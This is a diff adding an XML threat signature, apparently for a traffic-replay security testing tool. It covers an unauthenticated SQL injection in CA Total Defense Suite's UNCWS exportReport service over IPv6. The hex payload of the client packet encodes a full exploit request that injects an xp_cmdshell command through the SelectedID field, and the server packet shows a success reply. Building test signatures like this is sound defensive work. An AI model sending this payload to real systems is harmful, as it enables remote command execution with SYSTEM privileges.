@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="CA Total Defense Suite UNCWS exportReport SQL Injection(IPV6 Version)"/>
+    <EngDesc display="true" value="An SQL Injection vulnerability exists in CA Total Defense Suite UNC Management Console. The vulnerability is&#13;&#10;due to insufficient sanitization of the request parameters in a stored procedure. A remote unauthenticated attacker&#13;&#10;can exploit this vulnerability by sending a craft SOAP request to the target on port 34444 for HTTP and 34443 for&#13;&#10;HTTPS. Any injected SQL commands will run with DBA privileges.&#13;&#10;This vulnerability can be leveraged by a remote unauthenticated attacker to execute arbitrary code on a target&#13;&#10;system with SYSTEM privileges by the means of SQL exec function."/>
+    <Intent display="true">
+      <item value="SQL_Injection"/>
+    </Intent>
+    <Protocol display="true" value="IPV6,HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="CA"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Total_Defense_Suite"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_R12_SE3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20120208-09"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="1b1aaa93438bb8599366e50b83828272"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="Network"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634685294930773828"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1333099839" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="48:5B:39:02:A8:DE" destMac="00:0C:29:F3:9F:8B" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <TCP srcPort="53762" destPort="$destPort" SeqNumber="A5C6110B" AckNumber="F305E594" HeaderLength="08" WindowSize="002E" Checksum="7240" UrgentPointer="0000" Options="0101080A0AAAA09F00000000" Payload="504F5354202F554E4357532F4D616E6167656D656E742E61736D7820485454502F312E310D0A486F73743A203139322E3136382E302E36370D0A436F6E74656E742D547970653A20746578742F786D6C3B20636861727365743D7574662D380D0A534F4150416374696F6E3A2022687474703A2F2F74656D707572692E6F72672F6578706F72745265706F7274220D0A436F6E74656E742D4C656E6774683A203638320D0A0D0A3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D227574662D38223F3E0A3C736F61703A456E76656C6F706520786D6C6E733A7873693D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612D696E7374616E63652220786D6C6E733A7873643D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612220786D6C6E733A736F61703D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E76656C6F70652F223E0A20203C736F61703A426F64793E0A202020203C6578706F72745265706F727420786D6C6E733D22687474703A2F2F74656D707572692E6F72672F223E0A2020202020203C456E746572707269736549443E303C2F456E746572707269736549443E0A2020202020203C5265706F727449443E313038323C2F5265706F727449443E0A2020202020203C5265706F72744E616D653E5265706F72744E616D653C2F5265706F72744E616D653E0A2020202020203C466F726D617449443E313C2F466F726D617449443E0A2020202020203C474D543E474D542D353C2F474D543E0A2020202020203C67656E65726174656F7074696F6E73786D6C3E786D6C737472696E673C2F67656E65726174656F7074696F6E73786D6C3E0A2020202020203C5573657249443E313C2F5573657249443E0A2020202020203C53656C656374656449443E313038322C3131293B2065786563206D61737465722E64626F2E78705F636D647368656C6C20226563686F20506F433E633A5C706F632E747874223B2D2D3C2F53656C656374656449443E0A2020202020203C6C616E673E656E3C2F6C616E673E0A202020203C2F6578706F72745265706F72743E0A20203C2F736F61703A426F64793E0A3C2F736F61703A456E76656C6F70653E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:F3:9F:8B" destMac="48:5B:39:02:A8:DE" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
+          <TCP srcPort="$destPort" destPort="53762" SeqNumber="F305E594" AckNumber="A5C6145C" HeaderLength="08" WindowSize="F79F" Checksum="FFBC" UrgentPointer="0000" Options="0101080A00001C770AAAA09F" Payload="485454502F312E3120323030204F4B0D0A446174653A204D6F6E2C203035204D617220323031322031363A34333A313120474D540D0A5365727665723A204D6963726F736F66742D4949532F362E300D0A582D506F77657265642D42793A204153502E4E45540D0A582D4173704E65742D56657273696F6E3A20322E302E35303732370D0A43616368652D436F6E74726F6C3A20707269766174652C206D61782D6167653D300D0A436F6E74656E742D547970653A20746578742F786D6C3B20636861727365743D7574662D380D0A436F6E74656E742D4C656E6774683A203336370D0A0D0A3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D227574662D38223F3E3C736F61703A456E76656C6F706520786D6C6E733A736F61703D22687474703A2F2F736368656D61732E786D6C736F61702E6F72672F736F61702F656E76656C6F70652F2220786D6C6E733A7873693D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D612D696E7374616E63652220786D6C6E733A7873643D22687474703A2F2F7777772E77332E6F72672F323030312F584D4C536368656D61223E3C736F61703A426F64793E3C6578706F72745265706F7274526573706F6E736520786D6C6E733D22687474703A2F2F74656D707572692E6F72672F223E3C6578706F72745265706F7274526573756C743E535543434553533C2F6578706F72745265706F7274526573756C743E3C2F6578706F72745265706F7274526573706F6E73653E3C2F736F61703A426F64793E3C2F736F61703A456E76656C6F70653E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
